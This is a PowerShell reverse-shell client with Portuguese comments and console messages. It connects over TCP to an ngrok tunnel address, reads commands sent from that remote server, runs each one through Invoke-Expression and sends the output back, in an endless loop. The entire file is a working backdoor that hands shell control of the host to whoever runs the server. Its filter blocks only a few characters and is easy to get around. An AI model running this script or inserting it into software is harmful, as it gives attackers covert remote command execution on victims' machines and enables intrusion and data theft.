function Receber-Dados {
    param (
        [System.IO.Stream]$stream,
        [System.Text.StringBuilder]$buffer
    )

    $reader = New-Object System.IO.BinaryReader($stream)

    Write-Host "Verificando dados disponíveis no stream..."
    if ($stream.DataAvailable) {
        Write-Host "Dados disponíveis no stream. Lendo bytes..."
        $byteArray = $reader.ReadBytes(1024)

        if ($byteArray.Length -gt 0) {
            # Converte bytes para string, assumindo que a mensagem é uma string UTF-8
            $mensagemParcial = [System.Text.Encoding]::UTF8.GetString($byteArray)
            Write-Host "Dados lidos: $mensagemParcial"
            
            # Adiciona a mensagem parcial ao buffer
            $buffer.Append($mensagemParcial) | Out-Null
        } else {
            Write-Host "Nenhum dado lido do byteArray."
        }
    } else {
        Write-Host "Nenhum dado disponível no stream."
    }
}

function Processar-Mensagem {
    param (
        [string]$mensagemCompleta,
        [System.IO.Stream]$stream
    )

    Write-Host "Mensagem recebida (antes de executar): '$mensagemCompleta'"

    if ($mensagemCompleta -match '^\s*[^&\|<>\n]+\s*$') {
        try {
            # Executa a mensagem como comando
            Write-Host "Executando comando: $mensagemCompleta"
            $resultado = Invoke-Expression $mensagemCompleta

            # Envia o resultado de volta para o servidor
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $writer.WriteLine($resultado)
            Write-Host "Resultado do comando enviado de volta para o servidor: $resultado"
        } catch {
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $writer.WriteLine("Erro ao executar o comando: $_")
            Write-Host "Erro ao executar o comando: $_"
        }
    } else {
        Write-Host "Mensagem inválida para execução. Ignorando..."
    }
}

try {
    # Cria um socket TCP
    Write-Host "Criando socket TCP..."
    $socket = New-Object System.Net.Sockets.TcpClient

    # Conecta ao servidor
    $servidor = "0.tcp.sa.ngrok.io"
    $port = 16312
    try {
        Write-Host "Conectando ao servidor $servidor na porta $port..."
        $socket.Connect($servidor, $port)
        Write-Host "Conectado ao servidor $servidor na porta $port."
    } catch {
        Write-Host "Erro ao conectar ao servidor: $_"
        exit
    }

    # Obtém o stream de rede para leitura e escrita
    Write-Host "Obtendo o stream de rede..."
    $stream = $socket.GetStream()

    # Cria um BinaryReader para ler dados em formato de bytes
    $reader = New-Object System.IO.BinaryReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    Write-Host "Preparado para receber e enviar mensagens."

    # Buffer para armazenar dados recebidos
    $buffer = New-Object System.Text.StringBuilder

    # Loop para receber mensagens e executar comandos
    while ($true) {
        try {
            Receber-Dados -stream $stream -buffer $buffer

            if ($buffer.Length -gt 0) {
                # Processa a mensagem
                $mensagemCompleta = $buffer.ToString().Trim()
                Write-Host "Mensagem recebida completa: $mensagemCompleta"
                $buffer.Clear()

                # Processa a mensagem
                Write-Host "Iniciando execução do comando..."
                Processar-Mensagem -mensagemCompleta $mensagemCompleta -stream $stream
            }

            Start-Sleep -Milliseconds 100

        } catch {
            Write-Host "Erro na leitura dos bytes: $_"
            break
        }
    }
} catch {
    Write-Host "Erro geral: $_"
} finally {
    # Verifica se o socket está aberto antes de tentar fechar
    if ($socket -ne $null -and $socket.Connected) {
        try {
            Write-Host "Fechando conexão..."
            $socket.Close()
            Write-Host "Conexão fechada."
        } catch {
            Write-Host "Erro ao fechar a conexão: $_"
        }
    }
}
